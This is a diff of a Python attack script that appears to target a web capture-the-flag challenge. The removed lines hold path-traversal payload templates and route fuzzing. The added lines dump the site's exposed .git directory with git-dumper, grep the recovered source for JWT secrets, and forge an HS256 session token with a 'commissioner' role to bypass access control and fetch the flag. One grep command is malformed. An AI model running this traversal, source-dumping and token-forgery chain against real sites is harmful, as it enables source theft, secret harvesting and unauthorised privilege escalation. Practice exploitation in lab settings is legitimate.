@@ -1,89 +1,122 @@
 #!/usr/bin/env python3
-import re, urllib.request, urllib.error
+import os, re, subprocess, sys, base64, hmac, hashlib, json, urllib.request, urllib.error
 
 BASE = "https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com"
+OUT = "dump"
 
-def req(path, cookie=None, headers=None):
-    # do not let urllib normalize away ../ : build opener manually
+def sh(cmd):
+    print("$", cmd)
+    p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
+    print(p.stdout[-4000:])
+    if p.returncode != 0:
+        print("STDERR:", p.stderr[-2000:])
+    return p
+
+# 1. install git-dumper
+sh(f"{sys.executable} -m pip install --quiet git-dumper || pip install --quiet git-dumper")
+# 2. dump exposed .git
+sh(f"git-dumper {BASE}/.git/ {OUT}")
+
+# 3. list recovered files
+print("\n########## RECOVERED FILES ##########")
+recovered = []
+for root, dirs, files in os.walk(OUT):
+    if ".git" in root.split(os.sep):
+        continue
+    for f in files:
+        p = os.path.join(root, f)
+        recovered.append(p)
+        print(p, os.path.getsize(p))
+
+# if working tree wasn't checked out, do it
+sh(f"cd {OUT} && git checkout -- . 2>/dev/null; git checkout HEAD -- . 2>/dev/null; git reset --hard 2>/dev/null; ls -la")
+recovered = []
+for root, dirs, files in os.walk(OUT):
+    if os.sep+".git" in root or root.endswith(".git"):
+        continue
+    for f in files:
+        recovered.append(os.path.join(root, f))
+
+print("\n########## SOURCE DUMPS ##########")
+SECRET = None
+for p in recovered:
+    if re.search(r"\.(js|ts|json|env|py|txt|md)$", p) or "env" in os.path.basename(p).lower():
+        try:
+            data = open(p, "r", encoding="utf-8", errors="replace").read()
+        except Exception as e:
+            print("skip", p, e); continue
+        print(f"\n===== {p} ({len(data)} bytes) =====")
+        print(data[:6000])
+        for m in re.finditer(r"(?i)(secret|jwt[_-]?secret|sign|token[_-]?secret)\s*[:=]\s*[\"'`]([^\"'`]+)[\"'`]", data):
+            print("  >> POSSIBLE SECRET:", m.group(0))
+            if SECRET is None:
+                SECRET = m.group(2)
+        for m in re.finditer(r"[A-Za-z0-9_]{2,15}\{[^}\r\n]{2,120}\}", data):
+            print("  >> FLAG-LIKE:", m.group(0))
+
+# 4. grep everything for flag/secret
+print("\n########## GREP ##########")
+sh(f"grep -rniE 'secret|flag\\{{|zdk\\{{|commissioner|jwt|sign' {OUT} --include='*.js' --include='*.json' --include='*.env' --include='*.ts' --include='*.txt' 2>/dev/null | grep -viv '' | head -80")
+
+print("\nDETECTED SECRET:", repr(SECRET))
+
+# 5. forge with detected secret and fetch flag
+def b64u(b):
+    if isinstance(b, str): b = b.encode()
+    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+def req(path, cookie=None):
     r = urllib.request.Request(BASE + path)
-    r.add_header("User-Agent", "Mozilla/5.0 recon2")
+    r.add_header("User-Agent", "Mozilla/5.0")
     if cookie: r.add_header("Cookie", cookie)
-    for k, v in (headers or {}).items():
-        r.add_header(k, v)
     try:
         resp = urllib.request.urlopen(r, timeout=40)
-        return resp.status, dict(resp.getheaders()), resp.read().decode("utf-8", "replace")
+        return resp.status, resp.read().decode("utf-8", "replace")
     except urllib.error.HTTPError as e:
-        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
-    except Exception as e:
-        return -1, {}, f"ERR {e}"
+        return e.code, e.read().decode("utf-8", "replace")
 
-def line(st, p, hh, body):
-    is404 = ("Cannot GET" in body) or st == 404
-    snip = re.sub(r"\s+", " ", body)[:120]
-    tag = "   " if is404 else "***"
-    print(f"{tag} {st:>4} {p:48} ct={hh.get('Content-Type','')[:22]:22} {snip}")
-    return not is404
+st, body = req("/")
+import re as _re
+mm = _re.search(r"wo_session=([^;]+)", "")
+# fetch fresh member token via headers
+r = urllib.request.Request(BASE + "/"); r.add_header("User-Agent","x")
+resp = urllib.request.urlopen(r, timeout=40)
+setck = resp.getheader("Set-Cookie","")
+member = _re.search(r"wo_session=([^;]+)", setck).group(1)
+H,P,S = member.split(".")
+pay = json.loads(base64.urlsafe_b64decode(P+"="*(-len(P)%4)))
+print("member payload:", pay)
 
-print("############ /public/site.css ############")
-st, hh, body = req("/public/site.css")
-print("status", st, "len", len(body))
-print(body[:800])
-# any secret-looking comments?
-for m in re.findall(r"/\*.*?\*/", body, re.S):
-    print("CSS COMMENT:", m[:300])
+secrets_to_try = []
+if SECRET: secrets_to_try.append(SECRET)
 
-print("\n############ /public enumeration ############")
-pub = ["/public/", "/public", "/public/index.html", "/public/app.js", "/public/main.js",
-    "/public/site.js", "/public/script.js", "/public/bundle.js", "/public/server.js",
-    "/public/app.py", "/public/index.js", "/public/.env", "/public/config.js",
-    "/public/config.json", "/public/secret.txt", "/public/flag.txt", "/public/README.md",
-    "/public/package.json", "/public/site.css.map", "/public/robots.txt"]
-for p in pub:
-    line(*(lambda t: (t[0], p, t[1], t[2]))(req(p)))
+def try_secret(secret):
+    p = dict(pay); p["role"] = "commissioner"
+    header = {"alg":"HS256","typ":"JWT"}
+    h_ = b64u(json.dumps(header,separators=(",",":")))
+    p_ = b64u(json.dumps(p,separators=(",",":")))
+    sig = b64u(hmac.new(secret.encode(), f"{h_}.{p_}".encode(), hashlib.sha256).digest())
+    tok = f"{h_}.{p_}.{sig}"
+    st, body = req("/commissioner", cookie=f"wo_session={tok}")
+    denied = ("Commissioner access only" in body) or ("league role is" in body)
+    print(f"\n=== secret={secret!r} status={st} denied={denied} ===")
+    print("COOKIE:", tok)
+    if not denied:
+        print("*** ACCESS GRANTED ***")
+        print(body)
+        fl = _re.findall(r"[A-Za-z0-9_]{2,15}\{[^}\r\n]{2,160}\}", body)
+        fl = [x for x in fl if not any(b in x for b in ("document","function","window","var "))]
+        print("FLAGS:", fl)
+        return tok, body, fl
+    return None
 
-print("\n############ PATH TRAVERSAL / LFI via static ############")
-targets = ["server.js", "app.js", "index.js", "package.json", ".env", "config.js"]
-trav_tpls = [
-    "/public/../{f}",
-    "/public/../../{f}",
-    "/public/../../../{f}",
-    "/public/..%2f{f}",
-    "/public/..%2f..%2f{f}",
-    "/public/..%2f..%2f..%2f{f}",
-    "/public/%2e%2e/{f}",
-    "/public/%2e%2e%2f%2e%2e%2f{f}",
-    "/public/....//{f}",
-    "/public/....//....//{f}",
-    "/public/..%252f{f}",
-    "/public/%2e%2e%2f{f}",
-    "/public/..\\{f}",
-    "/public/..%5c{f}",
-    "/static/../{f}",
-    "/..%2f{f}",
-    "/{f}",
-]
-hit_secret = None
-for f in targets:
-    for tpl in trav_tpls:
-        p = tpl.format(f=f)
-        st, hh, body = req(p)
-        ok = ("Cannot GET" not in body) and st == 200 and "<!doctype html>" not in body.lower()[:40]
-        if ok:
-            print(f"*** POSSIBLE LFI {st} {p}")
-            print(body[:1500])
-            sm = re.search(r"(secret|SECRET|jwt|JWT)[^\n]{0,80}", body)
-            if sm: print("   SECRET-LINE:", sm.group(0))
+flag = None
+for s in secrets_to_try:
+    r_ = try_secret(s)
+    if r_:
+        flag = r_
+        break
 
-print("\n############ ROUTE FUZZ ############")
-routes = ["/dashboard","/manage","/roster","/trade","/transactions","/waivers","/draft",
-    "/matchup","/team","/teams","/health","/status","/version","/flag","/api/health",
-    "/api/status","/api/flag","/api/team","/api/league","/api/players","/api/scores",
-    "/api/user","/api/session","/api/settings","/settings","/console","/admin","/manage",
-    "/commissioner/flag","/commissioner/data","/commissioner/console","/lineup",
-    "/api/commissioner/settings","/api/v1","/graphql","/whoami","/debug","/env",
-    "/.git/HEAD","/.git/config","/backup.zip","/source.zip","/app.zip","/site.zip"]
-for p in routes:
-    line(*(lambda t: (t[0], p, t[1], t[2]))(req(p)))
-
-print("\nDONE")
+with open("flag.txt","w") as f:
+    f.write(str(flag))
+print("\nDONE, secret=", repr(SECRET))
